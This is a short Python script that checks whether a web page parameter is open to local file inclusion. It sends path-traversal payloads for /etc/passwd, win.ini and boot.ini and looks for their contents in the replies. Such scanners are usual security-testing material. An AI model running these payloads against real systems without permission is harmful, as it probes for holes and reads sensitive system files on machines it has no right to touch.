import requests

def check_lfi(url, param):
    
    payloads = [
        '../../../../../../etc/passwd',
        '../windows/win.ini',
        'C:\\boot.ini',
        'C:\\windows\\win.ini',
        '../../../../../../boot.ini'
    ]
    
    for payload in payloads:
        # Construct the URL with the payload
        test_url = f"{url}?{param}={payload}"
        try:
            response = requests.get(test_url)
            
            # Check if the response contains known LFI indicators
            if 'root:' in response.text or '[boot loader]' in response.text:
                print(f"[+] LFI vulnerability detected with payload: {payload}")
                print(f"URL: {test_url}")
            else:
                print(f"[-] No LFI detected with payload: {payload}")
        
        except requests.exceptions.RequestException as e:
            print(f"Error with URL {test_url}: {e}")

# Example usage
url = 'http://example.com/vulnerable_page'
param = 'file'
check_lfi(url, param)
